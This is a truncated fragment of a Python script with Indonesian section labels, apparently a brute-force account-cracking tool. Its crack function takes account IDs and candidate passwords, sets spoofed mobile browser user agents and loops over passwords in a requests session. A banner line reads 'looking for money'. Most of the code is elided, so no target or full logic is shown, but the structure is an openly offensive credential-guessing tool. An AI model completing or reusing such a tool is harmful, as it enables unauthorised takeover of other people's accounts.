...
def banner():
    ...
    {m}•{k}•{h}•{sir} AUTHOR : PARIZ HERMAWAN {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}🤣{k}🤣{h}🤣{x} Sedang Mencari Duit {m}🤣{k}🤣{h}🤣{x} <<<<< ')
	print('')
...
def crack(idf,pwv):
	...
	sys.stdout.flush()
	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36'
	ua2 = 'Mozilla/5.0 (Linux; Android 11; RMX3231) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36'
	ses = requests.Session()
	for pw in pwv:
		try:
